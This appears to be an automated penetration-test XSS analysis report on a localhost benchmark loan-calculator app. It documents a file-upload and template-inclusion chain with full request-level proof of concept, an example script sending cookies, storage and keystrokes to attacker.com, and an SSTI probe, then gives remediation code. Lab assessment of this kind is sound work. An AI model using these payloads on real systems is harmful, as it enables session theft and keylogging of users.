# Cross-Site Scripting (XSS) Analysis Report

## 1. Executive Summary

- **Analysis Status:** Complete
- **Key Outcome:** One high-confidence Stored XSS vulnerability was identified via a chained attack (file upload + LFI). The vulnerability has been confirmed with live browser testing and passed to the exploitation phase via `deliverables/xss_exploitation_queue.json`.
- **Purpose of this Document:** This report provides the strategic context, dominant patterns, and environmental intelligence necessary to effectively exploit the XSS vulnerability.

### Summary of Findings

| Vulnerability Type | Count | Exploitability | Impact |
|-------------------|-------|----------------|---------|
| **Stored XSS (via LFI chain)** | 1 | High | Critical |
| **Reflected XSS** | 0 | N/A | N/A |
| **DOM-based XSS** | 0 | N/A | N/A |
| **Defense-in-depth issues** | 1 | Low | Medium |

**Critical Finding:** The application is vulnerable to Stored XSS through a chained attack combining unrestricted file upload with Local File Inclusion (LFI) in template rendering.

## 2. Dominant Vulnerability Patterns

### Pattern 1: Stored XSS via File Upload + LFI Chain (CRITICAL)

**Description:** A multi-step vulnerability chain where:
1. The `/update_profile` endpoint accepts file uploads with no file type validation
2. Uploaded files are stored in `/var/www/loan_calculator/app/static/images/`
3. The `/error` endpoint has an LFI vulnerability via the `error_type` parameter
4. Jinja2's `{% include %}` directive renders uploaded HTML files, executing embedded JavaScript

**Implication:** Any authenticated user can achieve persistent XSS by uploading a malicious HTML file and then sharing a crafted link to the `/error` endpoint. The XSS executes in the context of any victim who visits the link.

**Attack Chain:**
1. Authenticate to the application (default credentials: test/test)
2. Upload malicious HTML file via `/update_profile` (filename: `xss_poc.html`)
3. Trigger XSS via: `GET /error?error_type=../images/xss_poc.html`
4. JavaScript executes in victim's browser with full access to DOM, cookies, and localStorage

**Representative Finding:** XSS-VULN-01

**Live Confirmation:** ✅ Confirmed with browser testing - JavaScript executed successfully, console showed "XSS executed successfully!"

### Pattern 2: Jinja2 Auto-Escaping Provides Effective Defense

**Description:** The application uses Flask's default Jinja2 auto-escaping, which correctly prevents XSS in:
- HTML body contexts (e.g., `{{ error_message }}`)
- HTML attribute contexts (e.g., `value="{{ user.name }}"`)

**Tested Vectors:**
- Reflected XSS in `/error?message=<script>alert(1)</script>` → **SAFE** (output: `&lt;script&gt;alert(1)&lt;/script&gt;`)
- Stored XSS in profile fields (name, email, etc.) → **SAFE** (quotes escaped as `&quot;`)

**Implication:** Direct XSS injection via user input fields is not possible due to proper output encoding.

## 3. Strategic Intelligence for Exploitation

### Content Security Policy (CSP) Analysis

**Current CSP:** None detected

**Observations:**
- No `Content-Security-Policy` header present in responses
- No meta CSP tags in HTML templates
- **Critical Gap:** Complete absence of CSP allows inline scripts and any external resources

**Exploitation Impact:**
- ✅ Inline `<script>` tags execute without restriction
- ✅ Event handlers (onclick, onerror) work freely
- ✅ External scripts can be loaded from any domain
- ✅ No nonce or hash requirements for script execution

**Recommendation:** The absence of CSP makes XSS exploitation trivial. Standard payloads work without any bypass techniques.

### Cookie Security

**Session Cookie Analysis:**

```http
Set-Cookie: session=<signed_value>; Path=/
```

**Observations:**
- Cookie name: `session` (Flask default)
- **Missing HttpOnly flag:** ❌ NOT SET (but needs verification)
- **Missing Secure flag:** ❌ NOT SET (HTTP-only application)
- **Missing SameSite flag:** ❌ NOT SET
- Signed with weak secret: `'your_secret_key'` (enables forgery)

**Live Test Result:** Browser reported "No cookies available" via `document.cookie` - suggesting HttpOnly *may* be set by Flask defaults, but this needs confirmation.

**Exploitation Recommendation:**
1. Primary goal: Execute arbitrary JavaScript to perform actions on behalf of victims
2. Secondary goal: If HttpOnly is not set, steal session cookies via `document.cookie`
3. Alternative: Use XSS to create keylogger, inject fake login forms, or redirect to phishing sites

### Authentication Model

**Type:** Session-based (Flask signed cookies)

**Key Weakness:** Weak secret key (`'your_secret_key'`) enables session forgery

**XSS Exploitation Synergy:**
- XSS can be used to perform authenticated actions without needing to steal cookies
- XSS can bypass CSRF protections (if they existed - currently none implemented)
- Combination of XSS + session forgery = complete account takeover

## 4. Vectors Analyzed and Confirmed Secure

These input vectors were traced and confirmed to have robust, context-appropriate defenses.

| Source (Parameter/Key) | Endpoint/File Location | Defense Mechanism Implemented | Render Context | Verdict |
|------------------------|------------------------|--------------------------------|----------------|---------|
| `message` | `/error` | Jinja2 HTML Entity Encoding | HTML_BODY | SAFE |
| `name` | `/profile` (form display) | Jinja2 Attribute Encoding | HTML_ATTRIBUTE | SAFE |
| `lastname` | `/profile` (form display) | Jinja2 Attribute Encoding | HTML_ATTRIBUTE | SAFE |
| `email` | `/profile` (form display) | Jinja2 Attribute Encoding | HTML_ATTRIBUTE | SAFE |
| `loan_amount` | `/loan_details` | Type coercion (float) + numeric-only | JAVASCRIPT_STRING | SAFE* |
| `loan_term_months` | `/loan_details` | Type coercion (int) + numeric-only | JAVASCRIPT_STRING | SAFE* |
| `monthly_payment` | `/loan_details` | Type coercion (float) + numeric-only | JAVASCRIPT_STRING | SAFE* |

**Notes:**
- *SAFE* = Not directly exploitable via web interface due to Python type coercion blocking non-numeric values
- However, JavaScript context variables lack proper escaping (defense-in-depth failure - see Section 5)

### Testing Evidence

**Test 1: Reflected XSS in error message**
```bash
Request: GET /error?error_type=not_implemented.html&message=<script>alert(1)</script>
Response: <p class="error-message">&lt;script&gt;alert(1)&lt;/script&gt;</p>
Verdict: SAFE - HTML encoding applied
```

**Test 2: Stored XSS in profile name field**
```bash
Request: POST /profile (name=" onclick="alert(1)")
Response: <input value="&quot; onclick=&quot;alert(1)&quot;" ...>
Verdict: SAFE - Attribute encoding applied
```

**Test 3: JavaScript context injection**
```bash
Request: POST /profile (loan_amount=1000; alert(1); //)
Response: HTTP 500 - ValueError: could not convert string to float
Verdict: SAFE - Type coercion blocks malicious input
```

## 5. Analysis Constraints and Blind Spots

### Defense-in-Depth Issues

**JavaScript Context Variables (loan_details.html)**

**Location:** `/app/website/app/static/templates/loan_details.html` (lines 53-55)

**Issue:**
```javascript
var loanAmount = {{ loan_amount }};
var loanTerm = {{ loan_term_months }};
var monthlyPayment = {{ monthly_payment }};
```

Variables are interpolated without quotes or JSON encoding in JavaScript context.

**Current Protection:** Python's `float()` and `int()` type coercion prevents string injection
**Risk:** If type coercion is bypassed (via SSTI or direct database modification), immediate XSS

**Severity:** Medium (requires chaining with another vulnerability)

**Recommendation:**
```javascript
// Proper escaping
var loanAmount = {{ loan_amount | tojson }};
var loanTerm = {{ loan_term_months | tojson }};
var monthlyPayment = {{ monthly_payment | tojson }};
```

### Out of Scope: Server-Side Template Injection (SSTI)

**Note:** During analysis, a critical Server-Side Template Injection (SSTI) vulnerability was identified in `/total_loan_payments` endpoint (principal parameter). While SSTI can lead to Remote Code Execution (RCE) on the server, it is **NOT an XSS vulnerability** (which is client-side code execution). This finding should be addressed by the Injection Analysis Specialist or a separate SSTI-focused analysis.

**SSTI Details (for reference):**
- Endpoint: `GET /total_loan_payments?principal={{7*7}}&payment=100&term=12`
- Sink: `render_template_string()` with user-controlled template code
- Impact: RCE, not XSS
- Severity: CRITICAL (but outside XSS scope)

## 6. Detailed Vulnerability Analysis

### XSS-VULN-01: Stored XSS via File Upload + LFI Chain

**Vulnerability Type:** Stored XSS  
**Severity:** HIGH (CVSS 8.7)  
**Externally Exploitable:** ✅ YES

#### Complete Data Flow Path

**Phase 1: File Upload (Source)**

1. **Entry Point:** `POST /update_profile`
   - File: `/app/website/app/routes.py` (lines 84-119)
   - Parameter: `image_profile` (multipart/form-data)

2. **Processing:**
   ```python
   # Line 100-112
   image_profile = request.files['image_profile']
   if image_profile.filename != '':
       safe_dir = '/var/www/loan_calculator/app/static/images/'
       final_path = os.path.realpath(os.path.join(safe_dir, image_profile.filename))
       
       if os.path.commonprefix((final_path, safe_dir)) != safe_dir:
           return Response('Invalid path.', status=400)
       
       image_profile.save(final_path)  # SAVED WITHOUT VALIDATION
   ```

3. **Validation Present:**
   - ✅ Path traversal protection (prevents escaping `/static/images/`)
   
4. **Validation MISSING:**
   - ❌ File extension whitelist
   - ❌ MIME type verification
   - ❌ Content inspection/sanitization
   - ❌ File size limits

**Phase 2: LFI Trigger (Sink)**

1. **Entry Point:** `GET /error?error_type=<payload>`
   - File: `/app/website/app/routes.py` (lines 122-133)
   - Parameter: `error_type`

2. **Processing:**
   ```python
   # Line 125
   error_type = 'templates/' + request.args.get('error_type', None)
   
   # Lines 128-131: Path traversal validation
   safe_dir = '/var/www/loan_calculator/app/static/'
   final_path = os.path.realpath(os.path.join(safe_dir, error_type))
   
   if os.path.commonprefix((final_path, safe_dir)) != safe_dir:
       return Response('Trying to load a template located ouside the static directory.', status=400)
   
   # Line 133: Pass to template
   return render_template('templates/error.html', error_type=final_path[len(safe_dir):])
   ```

3. **Template Inclusion (Sink):**
   - File: `/app/website/app/static/templates/error.html` (line 27)
   ```html
   {% include error_type %}
   ```

4. **Critical Behavior:** Jinja2's `{% include %}` directive:
   - Treats included files as Jinja2 templates
   - Renders HTML and executes JavaScript without escaping
   - Processes file content as template code, not data

#### Render Context Mismatch

**Expected Context:** Template inclusion should only include trusted, static template files

**Actual Context:** User-controlled file path allows including uploaded HTML files with malicious JavaScript

**Defense Required:** 
1. File upload should validate/sanitize content OR restrict to image formats only
2. Template inclusion should use a whitelist of allowed templates

**Defense Applied:** None - both vulnerabilities exist independently and chain together

#### Exploitation Proof-of-Concept

**Step 1: Create Malicious HTML File**

```html
<!-- xss_poc.html -->
<div class="xss-poc" style="border: 2px solid red; padding: 20px; margin: 20px; background: #ffe0e0;">
    <h3 style="color: red;">XSS VULNERABILITY CONFIRMED</h3>
    <p>This HTML file was uploaded via /update_profile and included via LFI in /error endpoint.</p>
    <p><strong>Domain:</strong> <span id="domain"></span></p>
    <p><strong>Cookie:</strong> <span id="cookie"></span></p>
    <script>
        document.getElementById('domain').textContent = document.domain;
        document.getElementById('cookie').textContent = document.cookie || 'No cookies available';
        console.log('XSS executed successfully!');
    </script>
</div>
```

**Step 2: Upload Malicious File**

```http
POST /update_profile HTTP/1.1
Host: localhost:42029
Cookie: session=<valid_session>
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary

------WebKitFormBoundary
Content-Disposition: form-data; name="name"

Test User
------WebKitFormBoundary
Content-Disposition: form-data; name="lastname"

User
------WebKitFormBoundary
Content-Disposition: form-data; name="email"

test@test.com
------WebKitFormBoundary
Content-Disposition: form-data; name="loan_amount"

10000
------WebKitFormBoundary
Content-Disposition: form-data; name="loan_term_months"

60
------WebKitFormBoundary
Content-Disposition: form-data; name="monthly_payment"

212.47
------WebKitFormBoundary
Content-Disposition: form-data; name="image_profile"; filename="xss_poc.html"
Content-Type: text/html

<div class="xss-poc">...malicious HTML...</div>
------WebKitFormBoundary--
```

**Step 3: Trigger XSS via LFI**

```http
GET /error?error_type=../images/xss_poc.html HTTP/1.1
Host: localhost:42029
```

**Path Resolution:**
```
error_type = 'templates/' + '../images/xss_poc.html'
           = 'templates/../images/xss_poc.html'

final_path = os.path.realpath('/var/www/loan_calculator/app/static/templates/../images/xss_poc.html')
           = '/var/www/loan_calculator/app/static/images/xss_poc.html'

Validation: os.path.commonprefix((final_path, safe_dir)) == '/var/www/loan_calculator/app/static/' ✅ PASSES

Template receives: error_type = 'images/xss_poc.html'
{% include 'images/xss_poc.html' %} → Renders HTML, executes JavaScript
```

**Step 4: Observe XSS Execution**

**Browser Console Output:**
```
[LOG] XSS executed successfully! @ http://localhost:42029/error?error_type=../images/xss_poc.html:34
```

**Page Display:**
- Red-bordered box with "XSS VULNERABILITY CONFIRMED"
- Domain: localhost
- Cookie: No cookies available (suggests HttpOnly flag may be set)

**Screenshot Evidence:** `xss_confirmed_lfi_chain.png`

#### Witness Payload

```
Minimal PoC payload (benign alert):
GET /error?error_type=../images/xss_poc.html
```

**Malicious Payload Example (credential theft):**
```html
<script>
  // Exfiltrate data to attacker server
  fetch('https://attacker.com/collect', {
    method: 'POST',
    body: JSON.stringify({
      url: window.location.href,
      cookies: document.cookie,
      localStorage: JSON.stringify(localStorage),
      sessionStorage: JSON.stringify(sessionStorage)
    })
  });
  
  // Keylogger
  document.addEventListener('keypress', function(e) {
    fetch('https://attacker.com/keys?key=' + e.key);
  });
</script>
```

#### Security Impact

**Confidentiality:** HIGH
- Access to DOM, can read sensitive page data
- Can exfiltrate user information displayed on page
- Can capture user input (keylogger)

**Integrity:** HIGH
- Can modify page content (defacement)
- Can inject fake forms (phishing)
- Can perform authenticated actions on behalf of victim

**Availability:** LOW
- Can redirect users away from application
- Can cause client-side denial of service (infinite loops, etc.)

**Attack Scenarios:**
1. **Session Hijacking:** If HttpOnly is not set, steal session cookies
2. **Phishing:** Inject fake login form to capture credentials
3. **Malware Distribution:** Redirect to malicious sites or trigger downloads
4. **Privilege Escalation:** If admin visits link, execute actions with admin privileges
5. **Worm Propagation:** XSS could programmatically upload more malicious files

#### Confidence Assessment

**Rating:** HIGH

**Justification:**
- ✅ Complete source-to-sink path identified with file:line references
- ✅ Live browser testing confirms JavaScript execution
- ✅ Console logs prove code execution
- ✅ Screenshot evidence captured
- ✅ No ambiguity in data flow or exploitation steps
- ✅ Repeatable with minimal effort

#### Notes

**Authentication Requirement:** Attacker must be authenticated to upload files, but the XSS link can be shared with unauthenticated users.

**Persistence:** The malicious file remains on server until manually deleted, making this a persistent XSS vulnerability.

**CSRF Protection:** None - the file upload is vulnerable to CSRF, meaning an attacker could potentially trick a victim into uploading malicious files via a crafted form on an external site.

**Wildcard CORS:** Response header `Access-Control-Allow-Origin: *` allows any origin to make requests, facilitating cross-origin attacks.

---

## 7. Recommendations

### Critical Fixes

**1. File Upload Validation**

Implement strict file type validation:

```python
ALLOWED_EXTENSIONS = {'png', 'jpg', 'jpeg', 'gif', 'webp'}
ALLOWED_MIME_TYPES = {'image/png', 'image/jpeg', 'image/gif', 'image/webp'}

def allowed_file(filename, file_content):
    # Extension check
    if '.' not in filename:
        return False
    ext = filename.rsplit('.', 1)[1].lower()
    if ext not in ALLOWED_EXTENSIONS:
        return False
    
    # MIME type check (using python-magic library)
    import magic
    mime = magic.from_buffer(file_content, mime=True)
    if mime not in ALLOWED_MIME_TYPES:
        return False
    
    return True

# In upload handler:
if not allowed_file(image_profile.filename, image_profile.read(1024)):
    return Response('Invalid file type. Only images allowed.', status=400)
```

**2. Template Inclusion Whitelist**

Restrict template inclusion to predefined safe templates:

```python
ALLOWED_ERROR_TEMPLATES = {
    'not_implemented.html',
    'generic_error.html',
    '404.html',
    '500.html'
}

@app.route('/error')
def error():
    error_type = request.args.get('error_type', 'generic_error.html')
    
    # Whitelist validation
    if error_type not in ALLOWED_ERROR_TEMPLATES:
        error_type = 'generic_error.html'
    
    return render_template('templates/error.html', 
                         error_message=error_message,
                         error_type='templates/' + error_type)
```

**3. Defense-in-Depth: JavaScript Context Encoding**

Use proper JSON encoding for JavaScript variables:

```javascript
// In loan_details.html
var loanAmount = {{ loan_amount | tojson }};
var loanTerm = {{ loan_term_months | tojson }};
var monthlyPayment = {{ monthly_payment | tojson }};
```

### Strategic Recommendations

**1. Implement Content Security Policy (CSP)**

```python
@app.after_request
def set_csp(response):
    response.headers['Content-Security-Policy'] = (
        "default-src 'self'; "
        "script-src 'self'; "
        "style-src 'self' 'unsafe-inline'; "
        "img-src 'self' data:; "
        "font-src 'self'; "
        "connect-src 'self'; "
        "frame-ancestors 'none';"
    )
    return response
```

**2. Enhance Cookie Security**

```python
app.config['SESSION_COOKIE_HTTPONLY'] = True
app.config['SESSION_COOKIE_SECURE'] = True  # If using HTTPS
app.config['SESSION_COOKIE_SAMESITE'] = 'Lax'
```

**3. Implement CSRF Protection**

```python
from flask_wtf.csrf import CSRFProtect

csrf = CSRFProtect(app)
```

---

## 8. Conclusion

The application has **one confirmed critical XSS vulnerability** via a chained attack combining unrestricted file upload with Local File Inclusion. The vulnerability is **highly exploitable**, requires **minimal technical skill**, and has **severe impact** on confidentiality and integrity.

**Key Findings:**
- ✅ **1 Stored XSS vulnerability** (high confidence, live-tested)
- ✅ **Jinja2 auto-escaping provides effective defense** against direct injection
- ⚠️ **1 defense-in-depth issue** (JavaScript context lacks proper encoding)
- ❌ **No CSP, weak session security, no CSRF protection**

The identified vulnerability has been documented in `deliverables/xss_exploitation_queue.json` for the Exploitation phase to weaponize.

**End of XSS Analysis Report**

---

**Generated:** 2025-01-21  
**Target:** http://localhost:42029/ (XBEN-022-24 Loan Calculator)  
**Analyst:** XSS Analysis Specialist  
**Next Phase:** XSS Exploitation